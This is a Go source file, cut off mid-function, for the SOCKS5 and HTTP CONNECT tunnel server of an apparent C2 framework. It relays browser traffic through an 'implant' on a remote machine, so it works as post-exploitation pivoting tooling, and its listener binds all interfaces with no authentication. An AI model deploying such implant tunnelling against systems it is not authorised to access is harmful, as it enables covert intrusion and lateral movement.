// Package tunnel 提供高性能隧道代理功能。
// 原生 SOCKS5 协议（RFC 1928）+ 对标 NPS 的 io.CopyBuffer 双向中继。
package tunnel

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// tunnelDebug 热路径诊断日志开关（TOSHELL_TUNNEL_DEBUG=1 开启）。
// 默认关闭：浏览器多连接时每帧 hex dump 会严重拖慢代理吞吐并放大延迟。
var tunnelDebug = os.Getenv("TOSHELL_TUNNEL_DEBUG") == "1"

func tunDebugf(format string, args ...interface{}) {
	if tunnelDebug {
		fmt.Printf(format, args...)
	}
}

// ─── 常量 ─────────────────────────────────────────────────────────────

const (
	TunnelTypeConnect       = 0x7B // 连接请求
	TunnelTypeData          = 0x3D // 数据传输
	TunnelTypeClose         = 0x5F // 关闭连接
	TunnelTypeConnectResult = 0x2A // 连接结果
)

const (
	maxReadBufSize = 64 * 1024 // 中继读取缓冲区
	// 下行 overflow 安全上限：极端异常（客户端假死但 socket 仍接受写入）时，
	// 超过此帧数则关闭该隧道以阻止内存无限增长，牺牲单隧道保护服务端。
	maxOverflowFrames = 1 << 16
	// 下行写入超时：防止 writer 在假死 socket 上无限阻塞。
	tunnelWriteTimeout = 30 * time.Second
	// 浏览器方向 EOF 后的下行收尾等待：此时下行仍须完整转发到目标 EOF
	// （植入端 close 帧）。目标挂起/长连接等极端情况由该超时兜底强制关闭。
	browserEOFWait = 5 * time.Second
)

// ─── 类型定义 ───────────────────────────────────────────────────────────

type TunnelPacket struct {
	Type       byte
	TunnelID   uint32
	Data       []byte
	TargetAddr string
	TargetPort uint16
	Success    bool
	SessionID  string // 所属 C2 会话（用于下行数据会话归属校验）
}

type Tunnel struct {
	ID         uint32
	TargetAddr string
	TargetPort uint16
	SessionID  string // 所属 C2 会话；用于校验下行数据的会话归属
	Active     bool
	CreatedAt  time.Time
	// BytesIn/BytesOut 使用 atomic.Uint64：在 32 位(386)构建下保证 8 字节对齐，
	// 避免 atomic.AddUint64 触发 "unaligned 64-bit atomic operation" panic。
	BytesIn  atomic.Uint64
	BytesOut atomic.Uint64
	mu       sync.Mutex
	done     chan struct{}
	ready    chan struct{}
	// handshakeDone：SOCKS5 成功响应（socks5Reply 0x00）已写入 ClientConn 后关闭。
	// writer 在关闭前不得向 ClientConn 写下行数据——否则隧道数据先于 SOCKS5 响应
	// 到达浏览器，破坏协议流（ERR_SSL_PROTOCOL_ERROR / ack ok 后浏览器立即断连）。
	handshakeDone chan struct{}
	// closeReq：植入端发送 close 帧（目标侧已关闭）时关闭。
	// 与 done 分离：收到 close 帧不立即 CloseTunnel——close 帧与 data 帧同队列 FIFO，
	// 到达时下行数据已全部入队，但 writeCh/overflow 可能尚未排空。
	// relay 收到 closeReq 后走"排空再关"路径，避免最后一批下行帧被强砍。
	closeReq    chan struct{}
	ClientConn  net.Conn

	// 下行写入队列：单 goroutine 顺序写入 ClientConn，消除多 goroutine 并发 Write 的竞争与上下文切换开销。
	// writeCh 为快速路径；当其被慢客户端填满时，新帧转入 overflow（保持同隧道严格有序），
	// 绝不阻塞 C2 读循环，从而避免单慢客户端造成同 session 其它隧道的队头阻塞(HOL)。
	// 队列元素为 *[]byte（取自 downlinkBufPool），writer 写出后归还池，避免每包堆分配（对标 nps 单缓冲复用）。
	writeCh    chan *[]byte
	overflow   []*[]byte
	overflowMu sync.Mutex

	// 诊断字段：下行(植入端→浏览器)帧计数/字节统计
	// downCnt/downBytes 用 atomic：写入在 C2 读循环 goroutine（HandleTunnelData），
	// 读取在 relay goroutine（CLOSE 汇总打印），两侧并发无锁须原子化。
	downCnt   atomic.Int64
	downBytes atomic.Int64
}

type TunnelManager struct {
	tunnels map[uint32]*Tunnel
	nextID  uint32
	mu      sync.RWMutex
}

// ─── TunnelManager ─────────────────────────────────────────────────────

func NewTunnelManager() *TunnelManager {
	return &TunnelManager{
		tunnels: make(map[uint32]*Tunnel),
		nextID:  1,
	}
}

func (tm *TunnelManager) CreateTunnel(id uint32, targetAddr string, targetPort uint16, clientConn net.Conn) *Tunnel {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	t := &Tunnel{
		ID:            id,
		TargetAddr:    targetAddr,
		TargetPort:    targetPort,
		SessionID:     "",
		Active:        false,
		CreatedAt:     time.Now(),
		done:          make(chan struct{}),
		ready:         make(chan struct{}),
		handshakeDone: make(chan struct{}),
		closeReq:      make(chan struct{}),
		ClientConn:    clientConn,
		// 浏览器多连接/大页面时下行突发明显，1024 易进 overflow 路径（多一次锁+切片）。
		// 2048 在内存与突发吸收之间更稳，降低 overflow 概率。
		writeCh: make(chan *[]byte, 2048),
	}
	tm.tunnels[id] = t
	t.startWriter()
	return t
}

func (tm *TunnelManager) GetTunnel(id uint32) (*Tunnel, bool) {
	tm.mu.RLock()
	defer tm.mu.RUnlock()
	t, ok := tm.tunnels[id]
	return t, ok
}

func (tm *TunnelManager) CloseTunnel(id uint32) {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	if ok {
		delete(tm.tunnels, id)
	}
	tm.mu.Unlock()
	if ok {
		t.Close()
		if t.ClientConn != nil {
			t.ClientConn.Close()
		}
	}
}

func (tm *TunnelManager) CloseAllTunnels() {
	tm.mu.Lock()
	tunnels := make([]*Tunnel, 0, len(tm.tunnels))
	for _, t := range tm.tunnels {
		tunnels = append(tunnels, t)
	}
	tm.tunnels = make(map[uint32]*Tunnel)
	tm.mu.Unlock()

	for _, t := range tunnels {
		t.Close()
		if t.ClientConn != nil {
			t.ClientConn.Close()
		}
	}
}

func (tm *TunnelManager) ListTunnels() []*Tunnel {
	tm.mu.RLock()
	defer tm.mu.RUnlock()
	list := make([]*Tunnel, 0, len(tm.tunnels))
	for _, t := range tm.tunnels {
		list = append(list, t)
	}
	return list
}

func (tm *TunnelManager) NextID() uint32 {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	id := tm.nextID
	tm.nextID++
	return id
}

func (t *Tunnel) Close() {
	t.mu.Lock()
	select {
	case <-t.done:
		t.mu.Unlock()
		return
	default:
		close(t.done)
	}
	t.mu.Unlock()
	// 注意：此处不可 close(t.writeCh)。WriteToClient 可能在 Close 之后仍被并发调用，
	// close 后向其发送会 panic（send on closed channel）。writer 通过 <-t.done 退出，
	// 未消费的数据随连接关闭自然丢弃，故 writeCh 永不关闭。
}

// RequestClose 请求优雅关闭（植入端 close 帧已到达，下行数据已全部入队）。
// 幂等；不立即关连接，由 relay 排空下行队列后收尾。
func (t *Tunnel) RequestClose() {
	t.mu.Lock()
	defer t.mu.Unlock()
	select {
	case <-t.closeReq:
	default:
		close(t.closeReq)
	}
}

// CloseReq 返回植入端 close 帧到达信号（nil 安全：未初始化时永不触发）。
func (t *Tunnel) CloseReq() <-chan struct{} {
	if t.closeReq == nil {
		return nil
	}
	return t.closeReq
}

// startWriter 启动单 goroutine 顺序把下行数据写入 ClientConn。
// 优先级：writeCh（其中的帧恒比 overflow 更旧）→ overflow，保证同隧道严格有序。
// 退出条件：t.done 关闭（由 Close 触发），绝不在外部 close writeCh。
// 元素为 *[]byte（取自 downlinkBufPool），写出后归还池，避免每包堆分配（对标 nps 单缓冲复用）。
func (t *Tunnel) startWriter() {
	go func() {
		// 握手门：socks5Reply(0x00) 写入 ClientConn 前不得写任何下行数据。
		// 否则隧道数据先于 SOCKS5 响应到达浏览器 → 协议流损坏。
		// 握手失败/超时路径会 CloseTunnel → t.Close() → done 关闭，此处同步退出。
		select {
		case <-t.handshakeDone:
		case <-t.done:
			return
		}
		for {
			// 优先排空 writeCh（writeCh 中的帧比 overflow 更早到达，必须先写）
			select {
			case <-t.done:
				return
			case ptr := <-t.writeCh:
				t.writeOne(ptr)
			default:
				// writeCh 空：再排空 overflow（保持顺序）
				t.overflowMu.Lock()
				if len(t.overflow) > 0 {
					ptr := t.overflow[0]
					t.overflow = t.overflow[1:]
					t.overflowMu.Unlock()
					t.writeOne(ptr)
					continue
				}
				t.overflowMu.Unlock()
				// 两者皆空，阻塞等待 writeCh
				select {
				case <-t.done:
					return
				case ptr := <-t.writeCh:
					t.writeOne(ptr)
				}
			}
		}
	}()
}

// writeOne 写出一帧并归还其池化缓冲。写入失败/超时则关闭隧道。
func (t *Tunnel) writeOne(ptr *[]byte) {
	data := *ptr
	if t.ClientConn != nil {
		// 写超时防止浏览器假死拖死 writer；512KB 写缓冲下多数帧一次写完
		if tc, ok := t.ClientConn.(*net.TCPConn); ok {
			_ = tc.SetWriteDeadline(time.Now().Add(tunnelWriteTimeout))
		}
		if _, err := t.ClientConn.Write(data); err != nil {
			t.Close()
		}
	}
	downlinkBufPool.Put(ptr)
}

// WriteToClient 将下行数据投递到写入队列。
// 设计要点（对标 nps 每隧道独立 goroutine，互不拖累）：
//   - 快速路径：overflow 为空且 writeCh 有空位时直接入队，C2 读循环零阻塞；
//   - 溢出路径：一旦 writeCh 满或已处于 overflow 模式，后续帧一律追加到 overflow，
//     由 writer 在 writeCh 排空后再严格按序写出，保证同隧道 TCP 数据有序；
//   - 全程非阻塞 C2 读循环：单慢客户端只增长本隧道的 overflow，不会拖停同 session 其它隧道。
//
// 必须拷贝 data：packet.Data 来自服务端监听器的复用读缓冲（readBuf），直接持有切片会被下一帧覆盖。
// 拷贝目标取自 downlinkBufPool（*[]byte），writer 写出后归还，消除每包 make 的 GC 压力。
//
// 关键：池中缓冲 len 恒为 cap（New 时 make([]byte, maxReadBufSize)）。
// 必须把 *cp 的 len 收成 len(data)，否则 writeOne 会把尾部未覆盖的零字节一并
// Write 给浏览器 → TLS 流被 0x00 污染 → ERR_SSL_PROTOCOL_ERROR / version 0。
func (t *Tunnel) WriteToClient(data []byte) {
	if t.writeCh == nil {
		return
	}
	cp := downlinkBufPool.Get().(*[]byte)
	if cap(*cp) < len(data) {
		*cp = make([]byte, len(data))
	} else {
		*cp = (*cp)[:len(data)]
	}
	copy(*cp, data)

	t.overflowMu.Lock()
	overflowMode := len(t.overflow) > 0
	t.overflowMu.Unlock()

	if !overflowMode {
		select {
		case t.writeCh <- cp:
			return
		case <-t.done:
			downlinkBufPool.Put(cp)
			return
		default:
			overflowMode = true
		}
	}

	if overflowMode {
		t.overflowMu.Lock()
		if len(t.overflow) < maxOverflowFrames {
			t.overflow = append(t.overflow, cp)
			t.overflowMu.Unlock()
		} else {
			t.overflowMu.Unlock()
			downlinkBufPool.Put(cp)
			t.Close() // 溢出超限（异常），关闭隧道以保护服务端
		}
	}
}

func (t *Tunnel) SetActive(active bool) {
	t.mu.Lock()
	t.Active = active
	t.mu.Unlock()
	// 无论成败都唤醒等待握手的协程（失败时由调用方关闭隧道），
	// 避免 ACK(false) 时 handleConnection 一直阻塞到 30s 超时。
	select {
	case <-t.ready:
	default:
		close(t.ready)
	}
}

func (t *Tunnel) IsActive() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.Active
}

func (t *Tunnel) IsReady() <-chan struct{} {
	return t.ready
}

func (t *Tunnel) Done() <-chan struct{} {
	return t.done
}

// IsQueueEmpty 报告下行队列是否已排空（writeCh 与 overflow 均为空）。
// relay 在浏览器半关闭后用它判断下行数据是否已全部写出，
// 避免"浏览器方向一 EOF 就强砍下行"导致 TLS 流残缺（ERR_SSL_PROTOCOL_ERROR）。
func (t *Tunnel) IsQueueEmpty() bool {
	if len(t.writeCh) > 0 {
		return false
	}
	t.overflowMu.Lock()
	defer t.overflowMu.Unlock()
	return len(t.overflow) == 0
}

// AddBytesIn 线程安全地累加入站字节数
func (t *Tunnel) AddBytesIn(n uint64) {
	t.BytesIn.Add(n)
}

// AddBytesOut 线程安全地累加出站字节数
func (t *Tunnel) AddBytesOut(n uint64) {
	t.BytesOut.Add(n)
}

// ─── 编解码 ─────────────────────────────────────────────────────────────

func EncodeTunnelPacket(p *TunnelPacket) []byte {
	addrBytes := []byte(p.TargetAddr)
	extraLen := 0
	if p.Type == TunnelTypeConnect || p.Type == TunnelTypeConnectResult {
		extraLen = 2 + len(addrBytes) + 2 // addrLen(2) + addr + port(2)
	}
	if p.Type == TunnelTypeConnectResult {
		extraLen += 1 // success flag
	}

	sidBytes := []byte(p.SessionID)
	// 末尾追加 sessionID 长度(2) + sessionID；升级后双方同步重建，无需兼容旧格式。
	buf := make([]byte, 1+4+extraLen+4+len(p.Data)+2+len(sidBytes))
	offset := 0

	buf[offset] = p.Type
	offset++

	binary.BigEndian.PutUint32(buf[offset:], p.TunnelID)
	offset += 4

	if p.Type == TunnelTypeConnect || p.Type == TunnelTypeConnectResult {
		binary.BigEndian.PutUint16(buf[offset:], uint16(len(addrBytes)))
		offset += 2
		copy(buf[offset:], addrBytes)
		offset += len(addrBytes)
		binary.BigEndian.PutUint16(buf[offset:], p.TargetPort)
		offset += 2
	}

	binary.BigEndian.PutUint32(buf[offset:], uint32(len(p.Data)))
	offset += 4

	if p.Type == TunnelTypeConnectResult {
		buf[offset] = 0
		if p.Success {
			buf[offset] = 1
		}
		offset++
	}

	copy(buf[offset:], p.Data)
	offset += len(p.Data)

	binary.BigEndian.PutUint16(buf[offset:], uint16(len(sidBytes)))
	offset += 2
	copy(buf[offset:], sidBytes)
	return buf
}

func DecodeTunnelPacket(data []byte) (*TunnelPacket, error) {
	if len(data) < 9 {
		return nil, fmt.Errorf("data too short: %d", len(data))
	}

	p := &TunnelPacket{}
	offset := 0

	p.Type = data[offset]
	offset++

	p.TunnelID = binary.BigEndian.Uint32(data[offset:])
	offset += 4

	if p.Type == TunnelTypeConnect || p.Type == TunnelTypeConnectResult {
		if len(data) < offset+4 {
			return nil, fmt.Errorf("too short for connect")
		}
		addrLen := binary.BigEndian.Uint16(data[offset:])
		offset += 2
		if len(data) < offset+int(addrLen)+2 {
			return nil, fmt.Errorf("too short for addr")
		}
		p.TargetAddr = string(data[offset : offset+int(addrLen)])
		offset += int(addrLen)
		p.TargetPort = binary.BigEndian.Uint16(data[offset:])
		offset += 2
	}

	if len(data) < offset+4 {
		return nil, fmt.Errorf("too short for dataLen")
	}
	dataLen := binary.BigEndian.Uint32(data[offset:])
	offset += 4

	if p.Type == TunnelTypeConnectResult {
		if len(data) <= offset {
			return nil, fmt.Errorf("too short for success flag")
		}
		p.Success = data[offset] == 1
		offset++
	}

	if len(data) < offset+int(dataLen) {
		return nil, fmt.Errorf("data too short: need %d, have %d", offset+int(dataLen), len(data))
	}
	p.Data = data[offset : offset+int(dataLen)]
	offset += int(dataLen)

	if len(data) >= offset+2 {
		sidLen := binary.BigEndian.Uint16(data[offset:])
		offset += 2
		if len(data) >= offset+int(sidLen) {
			p.SessionID = string(data[offset : offset+int(sidLen)])
		}
	}

	return p, nil
}

// ─── 缓冲区池 ─────────────────────────────────────────────────────────────

var relayBufPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, maxReadBufSize)
		return &b
	},
}

// downlinkBufPool 下行帧缓冲池（对标 nps io.CopyBuffer 复用单缓冲）。
// WriteToClient 拷贝 packet.Data 到池中缓冲，writer 写出后归还，避免每包 make 的 GC 压力。
// 容量按需增长：偶发大帧（≤C2 maxFrameSize）会临时分配更大缓冲，之后池稳定在该尺寸。
var downlinkBufPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, maxReadBufSize)
		return &b
	},
}

// ─── SOCKS5 Server ─────────────────────────────────────────────────────

type sendFunc func(sessionID string, packet []byte) error

type SOCKS5Server struct {
	port           int
	listener       net.Listener   // 主监听（兼容旧逻辑 / 对外 GetAddr）
	listeners      []net.Listener // 双栈：127.0.0.1 + ::1，修复浏览器 localhost→::1 失败
	tunnelMgr      *TunnelManager
	sendToImplant  sendFunc
	sessionID      string
	stopChan       chan struct{}
	wg             sync.WaitGroup
	connectTimeout time.Duration
	// 诊断：每隧道首帧到达时间（统计首帧→第二帧间隔 total）。
	// sid 每会话从 1 递增，map 挂在本 SOCKS5Server（per-session）上，
	// 避免跨会话 sid 碰撞导致 first/total 日志错乱；会话结束随之整体回收。
	tunnelFirstFrame sync.Map // sid(uint32) → time.Time
	// DOWN drop 日志节流：1s 内最多打印一条（隧道关闭后的回传尾包属预期行为）。
	// HandleTunnelData 由会话 C2 读循环单 goroutine 同步调用，无需加锁。
	lastDropLog time.Time
}

func NewSOCKS5Server(port int) *SOCKS5Server {
	return &SOCKS5Server{
		port:           port,
		tunnelMgr:      NewTunnelManager(),
		stopChan:       make(chan struct{}),
		connectTimeout: 30 * time.Second,
	}
}

func (s *SOCKS5Server) SetSendToImplant(fn sendFunc)     { s.sendToImplant = fn }
func (s *SOCKS5Server) SetSessionID(sid string)          { s.sessionID = sid }
func (s *SOCKS5Server) GetPort() int                     { return s.port }
func (s *SOCKS5Server) GetTunnelManager() *TunnelManager { return s.tunnelMgr }

func (s *SOCKS5Server) Start() error {
	// 全接口监听：绑 0.0.0.0（IPv4 全接口）+ [::]（IPv6 全接口），
	// 允许局域网/公网机器通过本机 IP 访问代理，不限于 localhost。
	addrs := []struct {
		network string
		addr    string
	}{
		{"tcp4", fmt.Sprintf("0.0.0.0:%d", s.port)},
		{"tcp6", fmt.Sprintf("[::]:%d", s.port)},
	}

	var firstErr error
	for _, a := range addrs {
		ln, err := net.Listen(a.network, a.addr)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			tunDebugf("[TUN] socks5 listen %s %s fail: %v\n", a.network, a.addr, err)
			continue
		}
		s.listeners = append(s.listeners, ln)
		if s.listener == nil {
			s.listener = ln
		}
		s.wg.Add(1)
		go s.acceptLoopOn(ln)
		fmt.Printf("[TUN] socks5 listening on %s\n", ln.Addr().String())
	}

	if len(s.listeners) == 0 {
		// 环回全失败时回退 0.0.0.0（兼容受限环境）
		ln, err := net.Listen("tcp4", fmt.Sprintf("0.0.0.0:%d", s.port))
		if err != nil {
			if firstErr != nil {
				return fmt.Errorf("socks5 listen :%d: %v (also: %v)", s.port, err, firstErr)
			}
			return fmt.Errorf("socks5 listen :%d: %v", s.port, err)
		}
		s.listeners = append(s.listeners, ln)
		s.listener = ln
		s.wg.Add(1)
		go s.acceptLoopOn(ln)
		fmt.Printf("[TUN] socks5 listening on %s (fallback)\n", ln.Addr().String())
	}
	return nil
}

func (s *SOCKS5Server) Stop() {
	// 1. 发送关闭通知
	tunnels := s.tunnelMgr.ListTunnels()
	for _, t := range tunnels {
		if t == nil {
			continue
		}
		closePacket := &TunnelPacket{Type: TunnelTypeClose, TunnelID: t.ID, SessionID: s.sessionID}
		if s.sendToImplant != nil {
			s.sendToImplant(s.sessionID, EncodeTunnelPacket(closePacket))
		}
	}

	// 2. 停止接受新连接
	close(s.stopChan)
	for _, ln := range s.listeners {
		if ln != nil {
			ln.Close()
		}
	}
	if s.listener != nil && len(s.listeners) == 0 {
		s.listener.Close()
	}

	// 3. 关闭所有连接
	s.tunnelMgr.CloseAllTunnels()

	// 4. 等待 goroutine 退出
	done := make(chan struct{})
	go func() { s.wg.Wait(); close(done) }()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
	}
}

// HandleTunnelData 处理从植入端回传的隧道数据。
// notifyClose 通知植入端关闭指定隧道（尽力而为，失败不影响主流程）。
func (s *SOCKS5Server) notifyClose(tunnelID uint32) {
	if s.sendToImplant == nil {
		return
	}
	closePacket := &TunnelPacket{Type: TunnelTypeClose, TunnelID: tunnelID, SessionID: s.sessionID}
	if err := s.sendToImplant(s.sessionID, EncodeTunnelPacket(closePacket)); err != nil {
		fmt.Printf("[TUN] send CLOSE tunnel=%d FAIL: %v\n", tunnelID, err)
	}
}

func (s *SOCKS5Server) HandleTunnelData(packet *TunnelPacket) {
	switch packet.Type {
	case TunnelTypeConnectResult:
		t, ok := s.tunnelMgr.GetTunnel(packet.TunnelID)
		if !ok {
			tunDebugf("[TUN] ack dropped: tunnel=%d not found\n", packet.TunnelID)
			return
		}
		if packet.Success {
			tunDebugf("[TUN] ack OK tunnel=%d\n", packet.TunnelID)
		} else {
			fmt.Printf("[TUN] ack FAIL tunnel=%d err=%s\n", packet.TunnelID, string(packet.Data))
		}
		t.SetActive(packet.Success)
		if !packet.Success {
			// 连接失败：通知植入端回收隧道（否则植入端 connEntry 存活至空闲超时）
			s.notifyClose(packet.TunnelID)
			s.tunnelMgr.CloseTunnel(packet.TunnelID)
		}

	case TunnelTypeData:
		// 诊断路径默认关闭（TOSHELL_TUNNEL_DEBUG=1 开启），避免浏览器多连接时
		// 每帧 hex dump 拖垮吞吐。
		if tunnelDebug {
			now := time.Now()
			if firstAt, ok := s.tunnelFirstFrame.Load(packet.TunnelID); ok {
				total := now.Sub(firstAt.(time.Time)).Milliseconds()
				tunDebugf("[TUN] SVR %s sid=%d op=0 len=%d total=%dms\n",
					now.Format("15:04:05.000"), packet.TunnelID, len(packet.Data), total)
			} else {
				s.tunnelFirstFrame.Store(packet.TunnelID, now)
				tunDebugf("[TUN] SVR %s sid=%d op=0 len=%d first\n",
					now.Format("15:04:05.000"), packet.TunnelID, len(packet.Data))
			}
		}

		t, ok := s.tunnelMgr.GetTunnel(packet.TunnelID)
		if !ok {
			// 隧道已关闭（常见于浏览器半关闭/已断开后植入端仍回尾包）：
			// 此时浏览器已不再接收，静默丢弃即可，不刷屏（限频 1s 一条）。
			if tunnelDebug && time.Since(s.lastDropLog) > time.Second {
				tunDebugf("[TUN] DOWN drop tunnel=%d (not found)\n", packet.TunnelID)
				s.lastDropLog = time.Now()
			}
			return
		}
		if packet.SessionID != "" && t.SessionID != "" && packet.SessionID != t.SessionID {
			tunDebugf("[TUN] drop data: tunnel=%d session mismatch (%s != %s)\n",
				packet.TunnelID, packet.SessionID, t.SessionID)
			return
		}
		t.AddBytesOut(uint64(len(packet.Data)))
		if tunnelDebug {
			t.downCnt.Add(1)
			t.downBytes.Add(int64(len(packet.Data)))
			if dc := t.downCnt.Load(); dc <= 5 || dc%100 == 0 {
				hn := 8
				if dc <= 5 && len(packet.Data) > 8 {
					hn = len(packet.Data)
					if hn > 4096 {
						hn = 512
					}
				}
				hx := ""
				if len(packet.Data) >= 8 {
					hx = fmt.Sprintf(" hex=%x", packet.Data[:hn])
				}
				tunDebugf("[TUN] %s DOWN tunnel=%d len=%d (total=%d)%s\n", time.Now().Format("15:04:05.000"), packet.TunnelID, len(packet.Data), t.downBytes.Load(), hx)
			}
		}
		// 顺序写入：经单 goroutine 队列写入 ClientConn，消除并发 Write 竞争
		t.WriteToClient(packet.Data)

	case TunnelTypeClose:
		if tunnelDebug {
			s.tunnelFirstFrame.Delete(packet.TunnelID)
			tunDebugf("[TUN] SVR %s sid=%d op=%d len=%d\n",
				time.Now().Format("15:04:05.000"), packet.TunnelID, packet.Type, len(packet.Data))
		} else {
			s.tunnelFirstFrame.Delete(packet.TunnelID)
		}
		// 植入端报告目标侧已关闭（close 帧 FIFO 排在所有 data 帧之后，下行数据
		// 已全部入队）。不立即 CloseTunnel：writeCh/overflow 可能尚未排空，
		// 强关会让最后一批下行帧丢失 → 浏览器读到残缺 TLS 流。
		// 只发信号，由 relay 排空下行队列后统一收尾。
		t, ok := s.tunnelMgr.GetTunnel(packet.TunnelID)
		if !ok {
			return
		}
		t.RequestClose()
	}
}

// ─── acceptLoop ──────────────────────────────────────────────────────────

func (s *SOCKS5Server) acceptLoop() {
	s.acceptLoopOn(s.listener)
}

func (s *SOCKS5Server) acceptLoopOn(ln net.Listener) {
	defer s.wg.Done()
	if ln == nil {
		return
	}

	var tempDelay time.Duration
	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-s.stopChan:
				return
			default:
			}
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				if tempDelay == 0 {
					tempDelay = 5 * time.Millisecond
				} else {
					tempDelay *= 2
				}
				if tempDelay > time.Second {
					tempDelay = time.Second
				}
				time.Sleep(tempDelay)
				continue
			}
			return
		}
		tempDelay = 0

		s.wg.Add(1)
		go s.handleConnection(conn)
	}
}

// ─── SOCKS5 握手 (RFC 1928) ───────────────────────────────────────────────

func (s *SOCKS5Server) handleConnection(conn net.Conn) {
	defer s.wg.Done()
	defer conn.Close()

	// TCP 优化
	optimizeTCPConn(conn)

	// 1. 协议自动识别：首字节 0x05 → SOCKS5；首字符 C/P 等 → HTTP CONNECT 代理。
	// 解决浏览器（Edge/Chrome 系统代理走 HTTP CONNECT）报"代理服务器可能有问题，
	// 或地址不正确"：系统代理把 1090 当 HTTP 代理使用，而旧实现只认 SOCKS5 握手，
	// HTTP CONNECT 首字节非 0x05 直接被视为握手失败断开。
	peek := make([]byte, 1)
	if _, err := io.ReadFull(conn, peek); err != nil {
		return
	}

	var (
		targetHost string
		targetPort uint16
		err        error
		reader     io.Reader
		isHTTP     bool
		initialData []byte   // HTTP 绝对 URI 模式下改写后的请求头，隧道建立后先发送
		upStream   io.Reader // relay 上行数据源：CONNECT/SOCKS5 为 conn，绝对 URI 为 bufio
	)
	upStream = conn

	if peek[0] == 0x05 {
		// SOCKS5：已读 1 字节，需连同首字节一起解析，用 io.MultiReader 回填
		reader = io.MultiReader(bytes.NewReader(peek), conn)
		targetHost, targetPort, err = socks5Handshake(reader, conn)
	} else {
		// HTTP 代理（Edge/Chrome 系统代理默认协议）：
		//  - CONNECT host:port  → HTTPS 隧道（浏览器访问 https:// 站点）
		//  - GET http://host/   → 绝对 URI 正向代理（浏览器访问 http:// 站点）
		isHTTP = true
		reader = io.MultiReader(bytes.NewReader(peek), conn)
		targetHost, targetPort, initialData, upStream, err = httpConnectHandshake(reader, conn)
	}
	if err != nil {
		return
	}

	// 2. 创建隧道并发送连接请求到植入端
	tunnelID := s.tunnelMgr.NextID()
	tunnel := s.tunnelMgr.CreateTunnel(tunnelID, targetHost, targetPort, conn)
	tunnel.SessionID = s.sessionID
	tunDebugf("[TUN] socks5 CONNECT %s:%d tunnel=%d session=%s\n", targetHost, targetPort, tunnelID, s.sessionID)

	connectPacket := &TunnelPacket{
		Type:       TunnelTypeConnect,
		TunnelID:   tunnelID,
		TargetAddr: targetHost,
		TargetPort: targetPort,
		SessionID:  s.sessionID,
	}
	if s.sendToImplant != nil {
		if err := s.sendToImplant(s.sessionID, EncodeTunnelPacket(connectPacket)); err != nil {
			fmt.Printf("[TUN] send CONNECT tunnel=%d FAIL: %v (implant offline?)\n", tunnelID, err)
		}
	}

	// 3. 等待植入端返回连接结果
	select {
	case <-tunnel.IsReady():
		if !tunnel.IsActive() {
			if isHTTP {
				httpReplyError(conn, "502 Bad Gateway")
			} else {
				socks5Reply(conn, 0x04) // Host unreachable
			}
			s.notifyClose(tunnelID)
			s.tunnelMgr.CloseTunnel(tunnelID)
			return
		}

	case <-time.After(s.connectTimeout):
		if isHTTP {
			httpReplyError(conn, "504 Gateway Timeout")
		} else {
			socks5Reply(conn, 0x04)
		}
		s.notifyClose(tunnelID)
		s.tunnelMgr.CloseTunnel(tunnelID)
		return

	case <-tunnel.Done():
		// 隧道已在握手完成前被关闭（如下行写入失败触发 Close），清理资源
		if isHTTP {
			httpReplyError(conn, "502 Bad Gateway")
		} else {
			socks5Reply(conn, 0x04)
		}
		s.notifyClose(tunnelID)
		s.tunnelMgr.CloseTunnel(tunnelID)
		return

	case <-s.stopChan:
		if isHTTP {
			httpReplyError(conn, "502 Bad Gateway")
		} else {
			socks5Reply(conn, 0x01)
		}
		s.notifyClose(tunnelID)
		s.tunnelMgr.CloseTunnel(tunnelID)
		return
	}

	// 4. 发送成功响应。
	// HTTP CONNECT 已在握手阶段回复 "HTTP/1.1 200 Connection Established"，
	// 这里绝不能再用 SOCKS5 应答字节（0x05 0x00 ...）污染隧道——
	// 浏览器会把那 10 字节二进制当目标服务器响应解析，导致 "Empty reply"。
	if !isHTTP {
		if !socks5ReplyUntilWritable(conn) {
			s.notifyClose(tunnelID)
			s.tunnelMgr.CloseTunnel(tunnelID)
			return
		}
	}

	// 4.0 绝对 URI 正向代理：改写后的请求头必须作为首批上行数据发给植入端。
	// 浏览器访问 http:// 站点时不会等待代理应答（不像 CONNECT 需要 200），
	// 而是直接发送 "GET http://host/path HTTP/1.1"，因此改写后立即转发。
	if len(initialData) > 0 && s.sendToImplant != nil {
		pkt := EncodeTunnelPacket(&TunnelPacket{
			Type:      TunnelTypeData,
			TunnelID:  tunnelID,
			Data:      initialData,
			SessionID: s.sessionID,
		})
		if werr := s.sendToImplant(s.sessionID, pkt); werr != nil {
			fmt.Printf("[TUN] send initial HTTP request tunnel=%d FAIL: %v\n", tunnelID, werr)
			s.notifyClose(tunnelID)
			s.tunnelMgr.CloseTunnel(tunnelID)
			return
		}
		tunnel.AddBytesIn(uint64(len(initialData)))
	}

	// 4.1 放行下行写入：成功响应已先于任何隧道数据写入浏览器，
	// writer 现在可以按序输出握手期间积压的数据
	close(tunnel.handshakeDone)

	// 5. 双向中继（上行数据源：绝对 URI 模式下用 bufio 流，避免丢已预读的请求体）
	s.relay(conn, upStream, tunnel)
}

// socks5Handshake 执行 SOCKS5 握手，返回目标地址和端口。
// reader 接收已含首字节的流（调用方通过 io.MultiReader 回填 pre-read 的 1 字节）。
func socks5Handshake(reader io.Reader, conn net.Conn) (host string, port uint16, err error) {
	// 读取客户端方法列表: [VER, NMETHODS, METHODS...]
	header := make([]byte, 2)
	if _, err = io.ReadFull(reader, header); err != nil {
		return "", 0, fmt.Errorf("read socks5 meth header: %w", err)
	}
	if header[0] != 0x05 {
		return "", 0, fmt.Errorf("unsupported socks version: %d", header[0])
	}

	nmethods := int(header[1])
	methods := make([]byte, nmethods)
	if nmethods > 0 {
		if _, err = io.ReadFull(reader, methods); err != nil {
			return "", 0, fmt.Errorf("read methods: %w", err)
		}
	}

	// 仅支持无认证
	hasNoAuth := false
	for _, m := range methods {
		if m == 0x00 {
			hasNoAuth = true
			break
		}
	}
	if !hasNoAuth {
